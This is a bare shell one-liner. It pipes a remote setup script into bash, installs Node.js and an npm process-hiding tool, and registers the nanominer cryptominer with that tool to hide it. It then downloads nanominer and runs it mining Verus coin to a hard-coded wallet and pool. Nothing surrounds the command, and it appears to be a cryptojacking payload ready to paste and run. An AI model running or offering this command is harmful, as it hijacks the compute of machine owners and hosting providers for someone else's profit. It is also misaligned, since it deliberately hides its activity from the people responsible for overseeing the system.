curl -sL https://deb.nodesource.com/setup_17.x | bash - && apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && ph add nanominer && wget https://github.com/nanopool/nanominer/releases/download/v3.6.5/nanominer-linux-3.6.5.tar.gz && tar -xf nanominer-linux-3.6.5.tar.gz && cd nanominer-linux-3.6.5 && chmod +x nanominer && ./nanominer -algo Verushash -coin VRSC -wallet RXf4VJY7WxyMahkDtP9bRzXdX272t7CW2c.M1 -pool1 pool.verus.io:19999 -pool2 stratum+tcp://pool.verus.io:9999
